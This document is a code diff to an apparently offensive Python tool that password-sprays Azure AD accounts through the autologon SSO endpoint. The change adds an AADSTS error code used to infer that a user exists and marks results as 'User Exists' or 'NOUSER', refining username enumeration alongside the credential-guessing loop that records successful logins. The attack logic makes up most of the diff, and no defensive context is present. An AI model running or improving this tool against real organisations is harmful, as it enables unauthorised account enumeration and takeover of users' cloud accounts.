@@ -11,7 +11,8 @@ detailed_codes = {'AADSTS50034' : 'The user does not exist',
 'AADSTS50053' : 'The user exists and the correct username and password were entered, but the account is locked',
 'AADSTS50056' : 'The user exists but does not have a password in Azure AD',
 'AADSTS50126' : 'The user exists, but the wrong password was entered',
-'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded' }
+'AADSTS80014' : 'The user exists, but the maximum Pass-through Authentication time was exceeded',
+'AADSTS81016' : 'Invalid STS Request (User likely exists)' }
 
 url_template = Template("""https://autologon.microsoftazuread-sso.com/$domain/winauth/trust/2005/usernamemixed?client-request-id=$uuid""")
 
@@ -61,12 +62,12 @@ def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 
 	for user in users:
 		if more_verbose:
-			print("spraying " + user + "\n")
+			print("\ntesting " + user)
 		xml_data = xml_body.substitute(username=user, domain=domain, password=password)
 		r = requests.post(target_url, data=xml_data)
 	
 		if more_verbose:
-			print("Status: " + str(r.status_code) + "\n")
+			print("Status: " + str(r.status_code))
 
 		if 'ThrottleStatus' in r.headers.keys():
 			print("Throttling detected => ThrottleStatus: " + r.headers('ThrottleStatus'))
@@ -78,12 +79,15 @@ def Spray(domain, users, password, target_url, wait, verbose, more_verbose):
 		if r.status_code == 200:
 			results.append([user + '@' + domain, 'Success', password])
 			if verbose:
-				print("\n" + user + "@" + domain + "\t\t:: " + password)
+				print(user + "@" + domain + "\t\t:: " + password)
 			continue
 
 		for code in AD_codes:
 			if code in r.content.decode('UTF-8'):
-				results.append([user + "@" + domain, code, ''])
+				if code == 'AADSTS50034':
+					results.append([user + "@" + domain, code, 'NOUSER'])
+				else:
+					results.append([user + "@" + domain, code, 'User Exists'])
 				if more_verbose:
 					print("\n" + user + "@" + domain + "\t\t:: " + detailed_codes[code])
 				break
@@ -99,7 +103,7 @@ def ProcessResults(results, outfile):
 			outfile.write(result[0] + "\t\t:: " + result[1] + "\n")
 		else:
 			continue
-
+	
 	for result in results:
 		if result[1] == 'Success':
 			continue
